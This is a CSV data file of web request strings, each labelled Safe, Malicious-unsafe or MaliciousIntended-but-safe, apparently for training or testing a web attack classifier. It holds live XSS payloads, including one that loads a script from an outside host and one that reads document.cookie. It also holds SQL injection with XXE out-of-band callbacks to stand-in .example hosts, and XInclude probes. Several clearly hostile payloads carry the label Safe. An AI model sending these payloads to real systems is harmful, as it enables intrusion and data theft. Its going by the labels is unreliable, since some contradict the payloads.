"""string"",""classification"""
"""/demo/xss/xml/vuln.xml.php?input=<script+xmlns=""""http://www.w3.org/1999/xhtml"""">setTimeout(""""top.frame2.location=""""javascript:(function+()+{var+x+=+document.createElement(\\""""script\\"""");x.src+=+\\""""//sdl.me/popup.js?//\\"""";document.childNodes\\[0\\].appendChild(x);}());"""""""",1000)</script>&//"",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body=<x:script xmlns:x=""""http://www.w3.org/1999/xhtml"""" src=""""data:,alert(1)"""" />"",""Malicious-unsafe"""
"""foo=<xssonbeforehellfreezes=alerw(1)>"",""Safe"""
"""/""""onmouseover='prompt(document.cookie)'"""""",""Malicious-unsafe"""
"""/index.php/<svg/onload=alert()"",""Malicious-unsafe"""
"""/?x=<script+>alert(1);</script>"",""Malicious-unsafe"""
"""/foo/bar</script><script>alert(1)</script>/"",""Malicious-unsafe"""
"""var=%uff1cscript%u0020%uff1ealert(1)%uff1c/script%uff1e"",""MaliciousIntended-but-safe"""
"""var=＜script ＞alert(1)＜/script＞"",""MaliciousIntended-but-safe"""
"""/?script+alert(1);/script=value"",""Safe"""
"""/?  onload= =vardata"",""Safe"""
"""/?  onabcdefgh= =vardata"",""Safe"""
"""/?  onab= =vardata"",""Safe"""
"""/?  onabcdefghijklmnopqrstuvwxyz= =vardata"",""Safe"""
"""var=555-555-0199@example.com'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%lbsodSYSTEM""""http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/"""">%lbsod;"",""Safe"""
"""var=<aaixmlns=""""http://a.b/""""xmlns:xsi=""""http://www.w3.org/2001/XMLSchema-instance""""xsi:schemaLocation=""""http://a.b/http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd"""">aai</aai>"",""Safe"""
"""var=abcd'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%cggerSYSTEM""""http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/"""">%cgger;"",""Safe"""
"""var=<acpxmlns:xi=""""http://www.w3.org/2001/XInclude""""><xi:includehref=""""http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo""""/></acp>"",""Safe"""
"""var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%grorjSYSTEM""""http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/"""">%grorj;"",""Safe"""
"""var=<afaxmlns=""""http://a.b/""""xmlns:xsi=""""http://www.w3.org/2001/XMLSchema-instance""""xsi:schemaLocation=""""http://a.b/http://2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar/afa.xsd"""">afa</afa>"",""Safe"""
"""var=<chjxmlns=""""http://a.b/""""xmlns:xsi=""""http://www.w3.org/2001/XMLSchema-instance""""xsi:schemaLocation=""""http://a.b/http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd"""">chj</chj>"",""Safe"""
"""var=/content.ini'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%dwusuSYSTEM""""http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/"""">%dwusu;"",""Safe"""
"""var=EmptyValue'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%awpsdSYSTEM""""http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/"""">%awpsd;"",""Safe"""
"""var=file:/boot.ini'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%cwtpcSYSTEM""""http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/"""">%cwtpc;"",""Safe"""
"""var=MatchedData:<!ENTITY%awfkeSYSTEMfoundwithinARGS_NAMES:1'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%awfkeSYSTEM""""http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/"""">%awfke;"",""Safe"""
"""var=<oezxmlns=""""http://a.b/""""xmlns:xsi=""""http://www.w3.org/2001/XMLSchema-instance""""xsi:schemaLocation=""""http://a.b/http://eygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar/oez.xsd"""">oez</oez>"",""Safe"""
